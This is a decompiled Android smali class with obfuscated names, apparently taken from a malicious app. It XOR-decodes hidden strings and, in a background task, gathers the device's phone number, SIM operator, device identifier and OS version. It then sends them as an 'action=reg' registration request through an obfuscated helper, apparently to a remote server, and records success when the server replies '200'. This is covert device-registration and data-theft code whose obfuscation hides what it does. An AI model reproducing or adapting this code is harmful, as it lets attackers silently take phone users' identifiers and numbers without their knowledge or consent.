.class public final Lzvy/zpfypq/bbuhtkwvaf/ac;
.super Landroid/os/AsyncTask;


# static fields
.field public static a:I

.field private static final c:[Ljava/lang/String;


# instance fields
.field private final b:Landroid/content/Context;


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0xb

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "5\u0014\u0019\u0017M="

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x24

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "wVL"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "$\u0005\u0008\u0018K+"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "7\u0003\u001b\u0018W1\u0003\u000e\u0014@"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "*\u0016"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "7\u0003\u001b"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "5\u000e\u0013\u001fA"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "3\u0003\u000e\u0002M*\u0008"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    const/16 v2, 0x8

    const-string v1, "5\u000e\u0013\u001fA"

    const/4 v0, 0x7

    move-object v3, v4

    goto :goto_0

    :pswitch_7
    aput-object v1, v3, v2

    const/16 v2, 0x9

    const-string v1, "!\t\u0012\u0014"

    const/16 v0, 0x8

    move-object v3, v4

    goto :goto_0

    :pswitch_8
    aput-object v1, v3, v2

    const/16 v2, 0xa

    const-string v1, ",\u000b\u0019\u0018"

    const/16 v0, 0x9

    move-object v3, v4

    goto/16 :goto_0

    :pswitch_9
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    return-void

    :pswitch_a
    const/16 v9, 0x45

    goto :goto_2

    :pswitch_b
    const/16 v9, 0x66

    goto :goto_2

    :pswitch_c
    const/16 v9, 0x7c

    goto :goto_2

    :pswitch_d
    const/16 v9, 0x71

    goto/16 :goto_2

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_a
        :pswitch_b
        :pswitch_c
        :pswitch_d
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
    .end packed-switch
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object p1, p0, Lzvy/zpfypq/bbuhtkwvaf/ac;->b:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method protected b([Ljava/lang/String;)Ljava/lang/String;
    .locals 12

    const/4 v8, 0x6

    const/4 v2, 0x1

    const/4 v1, 0x0

    sget-boolean v3, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    iget-object v0, p0, Lzvy/zpfypq/bbuhtkwvaf/ac;->b:Landroid/content/Context;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    aget-object v4, v4, v8

    invoke-virtual {v0, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/ac;->b:Landroid/content/Context;

    invoke-static {v4}, Lzvy/zpfypq/bbuhtkwvaf/d;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    move-result-object v0

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v7, Lzvy/zpfypq/bbuhtkwvaf/s;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, ","

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    sget-object v7, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/util/ArrayList;

    invoke-direct {v7, v8}, Ljava/util/ArrayList;-><init>(I)V

    :try_start_0
    new-instance v8, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v9, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v10, 0x2

    aget-object v9, v9, v10

    sget-object v10, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v11, 0x5

    aget-object v10, v10, v11

    invoke-direct {v8, v9, v10}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v8}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v8, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v9, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/16 v10, 0xa

    aget-object v9, v9, v10

    invoke-direct {v8, v9, v4}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v8}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v8, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/16 v9, 0x8

    aget-object v8, v8, v9

    invoke-direct {v4, v8, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v4, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v8, 0x4

    aget-object v5, v5, v8

    invoke-direct {v4, v5, v0}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v5, 0x7

    aget-object v4, v4, v5

    invoke-direct {v0, v4, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-instance v0, Lorg/apache/http/message/BasicNameValuePair;

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v5, 0x0

    aget-object v4, v4, v5

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/s;->g:Ljava/lang/String;

    invoke-direct {v0, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v7, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v4, 0x1

    aget-object v0, v0, v4

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/ac;->b:Landroid/content/Context;

    const/4 v5, 0x0

    invoke-static {v4, v7, v5}, Lzvy/zpfypq/bbuhtkwvaf/llllLIlLlIIllIllIlIIlLIllIlllIlLlIlIIllllIllllIIlIIIIlll;->a(Landroid/content/Context;Ljava/util/List;Z)Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/o;

    iget-object v4, p0, Lzvy/zpfypq/bbuhtkwvaf/ac;->b:Landroid/content/Context;

    invoke-direct {v0, v4}, Lzvy/zpfypq/bbuhtkwvaf/o;-><init>(Landroid/content/Context;)V

    sget-object v4, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/4 v5, 0x3

    aget-object v4, v4, v5

    sget-object v5, Lzvy/zpfypq/bbuhtkwvaf/ac;->c:[Ljava/lang/String;

    const/16 v6, 0x9

    aget-object v5, v5, v6

    invoke-virtual {v0, v4, v5}, Lzvy/zpfypq/bbuhtkwvaf/o;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    const/4 v4, 0x0

    :try_start_1
    sget v0, Lzvy/zpfypq/bbuhtkwvaf/z;->V:I
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v0, :cond_1

    if-eqz v3, :cond_2

    move v0, v1

    :goto_0
    sput-boolean v0, Lzvy/zpfypq/bbuhtkwvaf/s;->h:Z

    :cond_1
    return-object v4

    :catch_0
    move-exception v0

    throw v0

    :catch_1
    move-exception v0

    :try_start_2
    throw v0
    :try_end_2
    .catch Ljava/lang/RuntimeException; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    move-exception v0

    throw v0

    :cond_2
    move v0, v2

    goto :goto_0
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lzvy/zpfypq/bbuhtkwvaf/ac;->b([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method
